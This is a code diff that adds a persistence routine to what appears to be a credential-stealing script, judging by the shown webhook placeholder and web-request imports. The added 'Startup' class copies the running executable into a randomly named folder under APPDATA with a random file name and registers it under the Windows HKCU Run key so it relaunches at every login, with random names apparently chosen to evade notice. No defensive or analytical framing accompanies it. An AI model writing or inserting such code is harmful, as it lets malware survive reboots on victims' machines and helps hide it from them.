@@ -8,6 +8,54 @@ from re import findall
 from sys import platform as OS
 from typing import List, Optional
 from urllib.request import Request, urlopen
+import os
+import subprocess
+import random
+import string
+import sys
+
+class Startup:
+    def __init__(self):
+        self.dir_name = self.get_random_string(12)
+        self.working_dir = os.path.join(os.getenv("APPDATA"), self.dir_name)
+        self.exec_name = f"{self.get_random_string(16)}.exe"
+        self.full_path = os.path.join(self.working_dir, self.exec_name)
+        self.reg_entry = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+        self.regent_name = self.get_random_string(18)
+
+        self.mkdir()
+        self.copy_stub()
+        self.regedit()
+
+    def get_random_string(self, length):
+        letters = string.ascii_letters + string.digits
+        return ''.join(random.choice(letters) for _ in range(length))
+
+    def mkdir(self):
+        if not os.path.exists(self.working_dir):
+            os.mkdir(self.working_dir)
+
+    def copy_stub(self):
+        current_executable = os.path.abspath(sys.argv[0])
+        with open(current_executable, 'rb') as src:
+            with open(self.full_path, 'wb') as dst:
+                dst.write(src.read())
+
+    def regedit(self):
+        subprocess.run(f'reg delete "{self.reg_entry}" /v {self.regent_name} /f', shell=True)
+        subprocess.run(f'reg add "{self.reg_entry}" /v {self.regent_name} /t REG_SZ /d "{self.full_path}" /f', shell=True)
+
+def is_in_appdata():
+    current_executable = os.path.abspath(sys.argv[0])
+    appdata_path = os.getenv("APPDATA")
+    return current_executable.startswith(appdata_path)
+
+if __name__ == "__main__":
+    if not is_in_appdata():
+        Startup()
+
+
+
 
 # Constants
 WEBHOOK = "{WEBHOOK}"
